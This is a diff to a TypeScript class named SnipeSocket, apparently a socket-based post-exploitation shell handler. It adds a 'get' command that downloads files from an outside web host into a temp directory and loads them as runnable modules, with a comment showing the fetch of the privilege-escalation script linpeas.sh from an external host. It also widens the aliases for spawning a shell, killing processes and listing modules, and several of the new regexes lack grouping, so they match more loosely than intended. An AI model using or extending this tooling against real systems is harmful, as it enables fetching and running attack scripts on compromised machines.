@@ -260,7 +260,7 @@ class SnipeSocket {
 
       response.on('data', (chunk) => {
         cur += chunk.length;
-        this.progress(`Download: ${path.basename(file)}`, cur, len, total);
+        this.progress(`Download: ${url}`, cur, len, total);
       });
 
       response.on('end', () => {
@@ -314,7 +314,7 @@ class SnipeSocket {
 
   public spawn(cmd: string, args: string[] = [], opts?: SpawnOptionsWithoutStdio, cb?: (code: number|null) => void) {
     const defaults: SpawnOptionsWithoutStdio = {
-      cwd: '/tmp',
+      cwd: TMP_DIR,
       env: process.env
     };
 
@@ -372,11 +372,37 @@ class SnipeSocket {
     if (this.loaded) {
       if (/^run$/i.test(cmd)) {
         this.run(this.loaded.out);
-      } else if (/^stop$/i.test(cmd)) {
+      } else if (/^stop|kill|back|exit$/i.test(cmd)) {
         this.cp?.kill();
         this.reset();
       }
-    } else if (/^shell$/i.test(cmd)) {
+    } else if (/^w?get|download$/i.test(cmd)) {
+      // > get linpeas.sh http://f11snipe.sh/sh/linpeas.sh
+      if (args.length === 0) {
+        this.sock.write(colors['warn'](`Usage: get <file> [<url>]`));
+        this.prompt();
+      } else {
+        const name = args[0];
+        const file = `${TMP_DIR}/${name}`;
+        const url = args[1] || `${WEB_HOST}/${name}`;
+
+        this.sock.write(colors.cyan(`Downloading: ${url} -> ${file}`));
+        this.sock.write(NEWLINE);
+
+        this.download(file, url, (err) => {
+          if (err) msg('error', `Failed downloading: ${url} -> ${file}`);
+
+          LOAD_MAP[name] = name;
+
+          this.sock.write(NEWLINE);
+          this.sock.write(NEWLINE);
+          this.sock.write(colors.cyan(`#### Load new download: load ${name}`));
+          this.sock.write(NEWLINE);
+
+          this.prompt();
+        });
+      }
+    } else if (/^sh|bash|shell$/i.test(cmd)) {
       this.shell();
     } else if (Object.keys(LOAD_MAP).includes(cmd)) {
       this.load(cmd);
@@ -387,7 +413,7 @@ class SnipeSocket {
       } else {
         this.load(args[0]);
       }
-    } else if (/^show/i.test(cmd)) {
+    } else if (/^ls|list|show/i.test(cmd)) {
       this.sock.write(colors.cyan(`Available modules:\r\n`));
       Object.keys(LOAD_MAP).forEach(mod => {
         const map = LOAD_MAP[mod];
